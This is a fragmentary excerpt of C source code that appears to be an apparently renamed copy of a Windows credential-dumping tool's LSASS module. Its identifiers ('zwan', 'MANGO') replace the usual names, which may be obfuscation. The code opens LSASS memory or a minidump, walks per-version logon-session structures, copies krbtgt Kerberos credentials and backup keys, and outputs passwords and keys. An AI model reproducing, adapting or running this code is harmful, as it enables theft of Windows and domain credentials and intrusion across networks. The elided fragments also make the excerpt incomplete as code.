...
const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
	{sizeof(MANGO_MSV1_0_LIST_51), FIELD_OFFSET(MANGO_MSV1_0_LIST_51, LocallyUniqueIdentifier), FIELD_OFFSET(MANGO_MSV1_0_LIST_51, LogonType), FIELD_OFFSET(MANGO_MSV1_0_LIST_51, Session),	FIELD_OFFSET(MANGO_MSV1_0_LIST_51, UserName), FIELD_OFFSET(MANGO_MSV1_0_LIST_51, Domaine), FIELD_OFFSET(MANGO_MSV1_0_LIST_51, Credentials), FIELD_OFFSET(MANGO_MSV1_0_LIST_51, pSid), FIELD_OFFSET(MANGO_MSV1_0_LIST_51, CredentialManager), FIELD_OFFSET(MANGO_MSV1_0_LIST_51, LogonTime), FIELD_OFFSET(MANGO_MSV1_0_LIST_51, LogonServer)},
	{sizeof(MANGO_MSV1_0_LIST_52), FIELD_OFFSET(MANGO_MSV1_0_LIST_52, LocallyUniqueIdentifier), FIELD_OFFSET(MANGO_MSV1_0_LIST_52, LogonType), FIELD_OFFSET(MANGO_MSV1_0_LIST_52, Session),	FIELD_OFFSET(MANGO_MSV1_0_LIST_52, UserName), FIELD_OFFSET(MANGO_MSV1_0_LIST_52, Domaine), FIELD_OFFSET(MANGO_MSV1_0_LIST_52, Credentials), FIELD_OFFSET(MANGO_MSV1_0_LIST_52, pSid), FIELD_OFFSET(MANGO_MSV1_0_LIST_52, CredentialManager), FIELD_OFFSET(MANGO_MSV1_0_LIST_52, LogonTime), FIELD_OFFSET(MANGO_MSV1_0_LIST_52, LogonServer)},
	{sizeof(MANGO_MSV1_0_LIST_60), FIELD_OFFSET(MANGO_MSV1_0_LIST_60, LocallyUniqueIdentifier), FIELD_OFFSET(MANGO_MSV1_0_LIST_60, LogonType), FIELD_OFFSET(MANGO_MSV1_0_LIST_60, Session),	FIELD_OFFSET(MANGO_MSV1_0_LIST_60, UserName), FIELD_OFFSET(MANGO_MSV1_0_LIST_60, Domaine), FIELD_OFFSET(MANGO_MSV1_0_LIST_60, Credentials), FIELD_OFFSET(MANGO_MSV1_0_LIST_60, pSid), FIELD_OFFSET(MANGO_MSV1_0_LIST_60, CredentialManager), FIELD_OFFSET(MANGO_MSV1_0_LIST_60, LogonTime), FIELD_OFFSET(MANGO_MSV1_0_LIST_60, LogonServer)},
	{sizeof(MANGO_MSV1_0_LIST_61), FIELD_OFFSET(MANGO_MSV1_0_LIST_61, LocallyUniqueIdentifier), FIELD_OFFSET(MANGO_MSV1_0_LIST_61, LogonType), FIELD_OFFSET(MANGO_MSV1_0_LIST_61, Session),	FIELD_OFFSET(MANGO_MSV1_0_LIST_61, UserName), FIELD_OFFSET(MANGO_MSV1_0_LIST_61, Domaine), FIELD_OFFSET(MANGO_MSV1_0_LIST_61, Credentials), FIELD_OFFSET(MANGO_MSV1_0_LIST_61, pSid), FIELD_OFFSET(MANGO_MSV1_0_LIST_61, CredentialManager), FIELD_OFFSET(MANGO_MSV1_0_LIST_61, LogonTime), FIELD_OFFSET(MANGO_MSV1_0_LIST_61, LogonServer)},
	{sizeof(MANGO_MSV1_0_LIST_61_ANTI_zwan), FIELD_OFFSET(MANGO_MSV1_0_LIST_61_ANTI_zwan, LocallyUniqueIdentifier), FIELD_OFFSET(MANGO_MSV1_0_LIST_61_ANTI_zwan, LogonType), FIELD_OFFSET(MANGO_MSV1_0_LIST_61_ANTI_zwan, Session),	FIELD_OFFSET(MANGO_MSV1_0_LIST_61_ANTI_zwan, UserName), FIELD_OFFSET(MANGO_MSV1_0_LIST_61_ANTI_zwan, Domaine), FIELD_OFFSET(MANGO_MSV1_0_LIST_61_ANTI_zwan, Credentials), FIELD_OFFSET(MANGO_MSV1_0_LIST_61_ANTI_zwan, pSid), FIELD_OFFSET(MANGO_MSV1_0_LIST_61_ANTI_zwan, CredentialManager), FIELD_OFFSET(MANGO_MSV1_0_LIST_61_ANTI_zwan, LogonTime), FIELD_OFFSET(MANGO_MSV1_0_LIST_61_ANTI_zwan, LogonServer)},
	{sizeof(MANGO_MSV1_0_LIST_62), FIELD_OFFSET(MANGO_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(MANGO_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(MANGO_MSV1_0_LIST_62, Session),	FIELD_OFFSET(MANGO_MSV1_0_LIST_62, UserName), FIELD_OFFSET(MANGO_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(MANGO_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(MANGO_MSV1_0_LIST_62, pSid), FIELD_OFFSET(MANGO_MSV1_0_LIST_62, CredentialManager), FIELD_OFFSET(MANGO_MSV1_0_LIST_62, LogonTime), FIELD_OFFSET(MANGO_MSV1_0_LIST_62, LogonServer)},
	{sizeof(MANGO_MSV1_0_LIST_63), FIELD_OFFSET(MANGO_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(MANGO_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(MANGO_MSV1_0_LIST_63, Session),	FIELD_OFFSET(MANGO_MSV1_0_LIST_63, UserName), FIELD_OFFSET(MANGO_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(MANGO_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(MANGO_MSV1_0_LIST_63, pSid), FIELD_OFFSET(MANGO_MSV1_0_LIST_63, CredentialManager), FIELD_OFFSET(MANGO_MSV1_0_LIST_63, LogonTime), FIELD_OFFSET(MANGO_MSV1_0_LIST_63, LogonServer)},
};
...
{
	lsassLocalHelper = (zwan_NT_MAJOR_VERSION < 6) ? &lsassLocalHelpers[0] : 
	#ifdef LSASS_DECRYPT
		((zwan_NT_BUILD_NUMBER != 9431) ? &lsassLocalHelpers[1] : &lsassLocalHelpers[2])
	#else
		&lsassLocalHelpers[1]
	#endif
		;
				...
				if(kull_m_memory_open(Type, hData, &cLsass.hLsassMem))
				{
					if(Type == KULL_M_MEMORY_TYPE_PROCESS_DMP)
					{
						if(pInfos = (PMINIDUMP_SYSTEM_INFO) kull_m_minidump_stream(cLsass.hLsassMem->pHandleProcessDmp->hMinidump, SystemInfoStream))
						{
							...
							if(isError = (cLsass.osContext.MajorVersion != zwan_NT_MAJOR_VERSION) && !(zwan_NT_MAJOR_VERSION >= 6 && cLsass.osContext.MajorVersion >= 6))
								PRINT_ERROR(L"Minidump pInfos->MajorVersion (%u) != zwan_NT_MAJOR_VERSION (%u)\n", pInfos->MajorVersion, zwan_NT_MAJOR_VERSION);
						#ifdef _M_X64
					...
					else
					{
						...
						if(IsWow64Process(GetCurrentProcess(), &isError) && isError)
							PRINT_ERROR(zwan L" " zwan_ARCH L" cannot access x64 process\n");
						else
					#endif
						{						
							cLsass.osContext.MajorVersion = zwan_NT_MAJOR_VERSION;
							cLsass.osContext.MinorVersion = zwan_NT_MINOR_VERSION;
							cLsass.osContext.BuildNumber  = zwan_NT_BUILD_NUMBER;
						}
					}
...
{
	MANGO_BASIC_SECURITY_LOGON_SESSION_DATA sessionData;
	ULONG nbListes = 1, i;
	PVOID pStruct;
...
BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_logondata(IN PMANGO_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
{
...
void kuhl_m_sekurlsa_printinfos_logonData(IN PMANGO_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
...
void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, PCWSTR prefix)
{
	...
	MANGO_KRBTGT_CREDENTIALS_64 tmpCred64, *creds64;
	MANGO_KRBTGT_CREDENTIALS_6 tmpCred6, *creds6;
	MANGO_KRBTGT_CREDENTIALS_5 tmpCred5, *creds5;
	...
	if(addr)
	{
		...
		if(cLsass.osContext.MajorVersion < 6) // TODO: a field offset table
		{
			...
			if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(MANGO_KRBTGT_CREDENTIALS_5) - sizeof(MANGO_KRBTGT_CREDENTIAL_5)))
			{
				sizeForCreds = sizeof(MANGO_KRBTGT_CREDENTIALS_5) + (tmpCred5.cbCred - 1) * sizeof(MANGO_KRBTGT_CREDENTIAL_5);
				if(creds5 = (PMANGO_KRBTGT_CREDENTIALS_5) LocalAlloc(LPTR, sizeForCreds))
				{
		...
		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_BUILD_10_1607)
		{
			...
			if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(MANGO_KRBTGT_CREDENTIALS_6) - sizeof(MANGO_KRBTGT_CREDENTIAL_6)))
			{
				sizeForCreds = sizeof(MANGO_KRBTGT_CREDENTIALS_6) + (tmpCred6.cbCred - 1) * sizeof(MANGO_KRBTGT_CREDENTIAL_6);
				if(creds6 = (PMANGO_KRBTGT_CREDENTIALS_6) LocalAlloc(LPTR, sizeForCreds))
				{
		...
		else
		{
			...
			if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(MANGO_KRBTGT_CREDENTIALS_64) - sizeof(MANGO_KRBTGT_CREDENTIAL_64)))
			{
				sizeForCreds = sizeof(MANGO_KRBTGT_CREDENTIALS_64) + (tmpCred64.cbCred - 1) * sizeof(MANGO_KRBTGT_CREDENTIAL_64);
				if(creds64 = (PMANGO_KRBTGT_CREDENTIALS_64) LocalAlloc(LPTR, sizeForCreds))
				{
						...
						if(cb && (aLsass.address = pKeyBuffer))
						{
							...
							if(kull_m_memory_copy(&aData, &aLsass, sizeof(PVOID)))
							{
								if(aData.address = LocalAlloc(LPTR, cb))
								{
									...
									{
										kuhl_m_lsadump_analyzeKey(&guid, (PMANGO_BACKUP_KEY) aData.address, cb, isExport);
									}
...
#pragma warning(pop)
	...
	{
		if(zwan_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
		{
...
VOID kuhl_m_sekurlsa_genericCredsOutput(PMANGO_GENERIC_PRIMARY_CREDENTIAL mesCreds, PMANGO_BASIC_SECURITY_LOGON_SESSION_DATA pData, ULONG flags)
{
	PUNICODE_STRING username = NULL, domain = NULL, password = NULL;
	PMANGO_CREDENTIAL_KEYS pKeys = NULL;
	...
	if(mesCreds)
	{
		...
		else
		{
			if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10)
				mesCreds->Password = ((PMANGO_KERBEROS_10_PRIMARY_CREDENTIAL) mesCreds)->Password;
			else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10_1607)
				mesCreds->Password = ((PMANGO_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->Password;
...
VOID kuhl_m_sekurlsa_genericKeyOutput(PMANGO_CREDENTIAL_KEY key, LPCWSTR sid)
{
	if(key && key->cbData)
	{
		switch(key->type)
